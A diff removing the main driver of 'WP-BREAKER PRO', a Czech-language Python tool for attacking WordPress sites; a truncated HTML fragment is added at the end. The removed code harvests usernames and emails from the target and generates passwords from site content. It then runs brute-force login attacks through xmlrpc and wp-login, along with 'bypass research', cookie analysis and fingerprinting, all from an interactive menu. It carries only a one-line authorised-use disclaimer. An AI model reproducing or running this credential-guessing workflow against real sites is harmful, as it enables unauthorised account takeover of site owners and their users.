-    print(f"{Fore.CYAN}{'─' * 55}{Style.RESET_ALL}")
-
-
-def validate_target(url):
-    """Validuje a otestuje dostupnost targetu"""
-    global TARGET
-    
-    if not url.startswith(('http://', 'https://')):
-        url = 'https://' + url
-    
-    TARGET = url
-    
-    print(f"\n{Fore.CYAN}[*]{Style.RESET_ALL} Testuji připojení k {Fore.WHITE}{TARGET}{Style.RESET_ALL}...")
-    
-    try:
-        resp = requests.get(TARGET, timeout=10, verify=False, headers={"User-Agent": "Mozilla/5.0"})
-        if resp.status_code < 500:
-            print(f"  {Fore.GREEN}[✓]{Style.RESET_ALL} Target dostupný (HTTP {resp.status_code})")
-            
-            # Detekce WordPress
-            wp_indicators = ["/wp-content/", "/wp-includes/", "/wp-json/", "WordPress"]
-            is_wp = any(ind in resp.text for ind in wp_indicators)
-            if is_wp:
-                print(f"  {Fore.GREEN}[✓]{Style.RESET_ALL} WordPress detekován!")
-            else:
-                print(f"  {Fore.YELLOW}[!]{Style.RESET_ALL} WordPress nebyl detekován (ale může být za CDN)")
-            return True
-        else:
-            print(f"  {Fore.RED}[✗]{Style.RESET_ALL} Server vrátil chybu: HTTP {resp.status_code}")
-            return False
-    except requests.exceptions.ConnectionError:
-        print(f"  {Fore.RED}[✗]{Style.RESET_ALL} Nelze se připojit k serveru")
-        return False
-    except requests.exceptions.SSLError:
-        print(f"  {Fore.YELLOW}[!]{Style.RESET_ALL} SSL chyba, zkouším bez SSL verifikace...")
-        return True
-    except Exception as e:
-        print(f"  {Fore.RED}[✗]{Style.RESET_ALL} Chyba připojení: {str(e)[:50]}")
-        return False
-
-
-def run_full_scan(target, output):
-    """Spustí kompletní sken"""
-    output.phase("WP-BREAKER PRO FULL SCAN")
-    output.info("Spouštím kompletní bezpečnostní audit...")
-    print()
-    
-    start_time = time.time()
-    
-    # 1. TCP/IP Fingerprint
-    fingerprinter = TcpIpFingerprinter(target, output)
-    target_info = fingerprinter.fingerprint()
-    
-    # 2. AI Context Scraper
-    scraper = AIContextScraper(target, output)
-    context = scraper.scrape()
-    
-    # 3. DOM Shadow Analyzer
-    dom_analyzer = DOMShadowAnalyzer(target, output)
-    dom_findings = dom_analyzer.analyze()
-    
-    # 4. Cookie Engine
-    cookie_engine = CookieEngine(target, output)
-    cookie_results = cookie_engine.analyze_cookies()
-    
-    # 5. Bypass Researcher
-    bypass = BypassResearcher(target, output)
-    bypass_results = bypass.research()
-    
-    # 6. AI Self-Corrector
-    corrector = AISelfCorrector(output)
-    corrections = corrector.analyze_errors(bypass_results, dom_findings, context)
-    
-    # 7. AI Password Generator
-    pwd_gen = AIPasswordGenerator(context, output)
-    passwords, wordlist_file = pwd_gen.generate()
-    
-    # 8. Extrakt uživatelů pro brute-force
-    usernames = ["admin"]  # Vždy zkusíme admin
-    usernames.extend(context.get("users", []))
-    usernames.extend([e.split("@")[0] for e in context.get("emails", [])[:5]])
-    # Odstranění duplicit
-    usernames = list(dict.fromkeys(usernames))
-    
-    # 9. Brute Force
-    bruter = SmartBruteForcer(target, usernames, passwords[:100], output)
-    brute_results = bruter.brute_force()
-    
-    # 10. Sběr všech vulnerabilit
-    all_vulnerabilities = output.findings
-    
-    # 11. Generování reportu
-    reporter = AIReportGenerator(target, output)
-    report, score, grade = reporter.generate(target_info, all_vulnerabilities, brute_results, corrections, context)
-    
-    elapsed = time.time() - start_time
-    print(f"\n{Fore.CYAN}{Style.BRIGHT}{'=' * 55}{Style.RESET_ALL}")
-    print(f"{Fore.GREEN}{Style.BRIGHT}  ✓ FULL SCAN DOKONČEN za {elapsed:.1f} sekund{Style.RESET_ALL}")
-    print(f"{Fore.CYAN}{Style.BRIGHT}{'=' * 55}{Style.RESET_ALL}")
-    
-    return report
-
-
-# =============================================================================
-# VSTUPNÍ BOD
-# =============================================================================
-
-def main():
-    """Hlavní funkce"""
-    global TARGET
-    
-    # Clear screen
-    os.system('clear' if os.name == 'posix' else 'cls')
-    
-    print(BANNER)
-    print(f"  {Fore.WHITE}Vítejte v {Fore.RED}WP-BREAKER PRO v{VERSION}{Style.RESET_ALL}")
-    print(f"  {Style.DIM}HACKER-AI-DRIVEN WordPress Penetration Testing Tool{Style.RESET_ALL}")
-    print(f"  {Style.DIM}Autoři: HackerAI Security Research Team{Style.RESET_ALL}")
-    print(f"  {Fore.YELLOW}! Používejte pouze na systémy, ke kterým máte oprávnění !{Style.RESET_ALL}")
-    print()
-    
-    # Zadání targetu
-    while True:
-        print(f"{Fore.CYAN}[?]{Style.RESET_ALL} Zadejte cílovou URL (např. https://example.com): ", end="")
-        target_input = input().strip()
-        
-        if not target_input:
-            print(f"  {Fore.RED}[✗]{Style.RESET_ALL} URL nesmí být prázdná!")
-            continue
-        
-        if validate_target(target_input):
-            break
-        
-        print(f"  {Fore.YELLOW}[!]{Style.RESET_ALL} Chcete přesto pokračovat? (a/n): ", end="")
-        if input().strip().lower() != 'a':
-            continue
-        break
-    
-    # Inicializace output handleru
-    output = LiveOutput()
-    
-    while True:
-        os.system('clear' if os.name == 'posix' else 'cls')
-        print_banner()
-        show_menu()
-        
-        print(f"\n  {Fore.CYAN}[?]{Style.RESET_ALL} Zvolte možnost [0-10]: ", end="")
-        try:
-            choice = input().strip()
-        except (EOFError, KeyboardInterrupt):
-            print()
-            break
-        
-        if choice == "0":
-            print(f"\n  {Fore.YELLOW}Děkuji za použití WP-BREAKER PRO. Stay ethical! 🔒{Style.RESET_ALL}")
-            break
-        
-        elif choice == "1":
-            run_full_scan(TARGET, output)
-            print(f"\n  {Style.DIM}Stiskněte Enter pro návrat do menu...{Style.RESET_ALL}", end="")
-            input()
-        
-        elif choice == "2":
-            fp = TcpIpFingerprinter(TARGET, output)
-            fp.fingerprint()
-            print(f"\n  {Style.DIM}Stiskněte Enter pro návrat do menu...{Style.RESET_ALL}", end="")
-            input()
-        
-        elif choice == "3":
-            # Nejprve scraper pro kontext
-            scraper = AIContextScraper(TARGET, output)
-            context = scraper.scrape()
-            pwd_gen = AIPasswordGenerator(context, output)
-            passwords, _ = pwd_gen.generate()
-            
-            usernames = ["admin"]
-            usernames.extend(context.get("users", []))
-            usernames.extend([e.split("@")[0] for e in context.get("emails", [])[:5]])
-            usernames = list(dict.fromkeys(usernames))
-            
-            bruter = SmartBruteForcer(TARGET, usernames, passwords[:100], output)
-            bruter.method = "xmlrpc"
-            bruter.brute_force()
-            print(f"\n  {Style.DIM}Stiskněte Enter pro návrat do menu...{Style.RESET_ALL}", end="")
-            input()
-        
-        elif choice == "4":
-            scraper = AIContextScraper(TARGET, output)
-            context = scraper.scrape()
-            pwd_gen = AIPasswordGenerator(context, output)
-            passwords, _ = pwd_gen.generate()
-            
-            usernames = ["admin"]
-            usernames.extend(context.get("users", []))
-            usernames.extend([e.split("@")[0] for e in context.get("emails", [])[:5]])
-            usernames = list(dict.fromkeys(usernames))
-            
-            bruter = SmartBruteForcer(TARGET, usernames, passwords[:100], output)
-            bruter.method = "wplogin"
-            bruter.brute_force()
-            print(f"\n  {Style.DIM}Stiskněte Enter pro návrat do menu...{Style.RESET_ALL}", end="")
-            input()
-        
-        elif choice == "5":
-            ce = CookieEngine(TARGET, output)
-            ce.analyze_cookies()
-            print(f"\n  {Style.DIM}Stiskněte Enter pro návrat do menu...{Style.RESET_ALL}", end="")
-            input()
-        
-        elif choice == "6":
-            dom = DOMShadowAnalyzer(TARGET, output)
-            dom.analyze()
-            print(f"\n  {Style.DIM}Stiskněte Enter pro návrat do menu...{Style.RESET_ALL}", end="")
-            input()
-        
-        elif choice == "7":
-            bypass = BypassResearcher(TARGET, output)
-            bypass.research()
-            print(f"\n  {Style.DIM}Stiskněte Enter pro návrat do menu...{Style.RESET_ALL}", end="")
-            input()
-        
-        elif choice == "8":
-            scraper = AIContextScraper(TARGET, output)
-            scraper.scrape()
-            print(f"\n  {Style.DIM}Stiskněte Enter pro návrat do menu...{Style.RESET_ALL}", end="")
-            input()
-        
-        elif choice == "9":
-            scraper = AIContextScraper(TARGET, output)
-            context = scraper.scrape()
-            pwd_gen = AIPasswordGenerator(context, output)
-            pwd_gen.generate()
-            print(f"\n  {Style.DIM}Stiskněte Enter pro návrat do menu...{Style.RESET_ALL}", end="")
-            input()
-        
-        elif choice == "10":
-            reporter = AIReportGenerator(TARGET, output)
-            reporter.generate(output.findings, {}, [], [], {})
-            print(f"\n  {Style.DIM}Stiskněte Enter pro návrat do menu...{Style.RESET_ALL}", end="")
-            input()
-        
-        else:
-            print(f"\n  {Fore.RED}[✗]{Style.RESET_ALL} Neplatná volba! Stiskněte Enter...{Style.RESET_ALL}", end="")
-            input()
-
-
-if __name__ == "__main__":
-    try:
-        main()
-    except KeyboardInterrupt:
-        print(f"\n\n  {Fore.YELLOW}WP-BREAKER PRO ukončen uživatelem.{Style.RESET_ALL}")
-    except Exception as e:
-        print(f"\n\n  {Fore.RED}Kritická chyba: {str(e)}{Style.RESET_ALL}")
-        import traceback
-        traceback.print_exc()
+        <div class="stats">
+            <div class="stat
